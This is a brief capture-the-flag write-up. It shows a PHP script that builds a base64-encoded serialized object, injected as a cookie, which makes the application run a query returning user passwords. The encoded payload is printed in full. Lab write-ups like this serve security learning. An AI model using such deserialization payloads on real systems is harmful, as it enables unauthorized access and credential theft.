Wrote a php script to generate serialized object payload, this will help get the flag as the application currently does not validate the cookie value.
I wrote the script in php with vim and was able to reproduce a cookie value and injected it using the burp suite repeater tool. 

<?php 

class SQL
{
	public $query;
	public $conn;

	function __construct()
	{	
		$this->query = 'SELECT password AS username FROM users;';
		$this->conn = NULL;
	}
}

$sql = new SQL();

$obj = serialize($sql);

echo $obj . "\n";
echo base64_encode($obj) . "\n";

the cookie value was returned as TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzOyI7czo0OiJjb25uIjtOO30=
and this cookie was injected in the repeater tool in the request and the flag was discovered
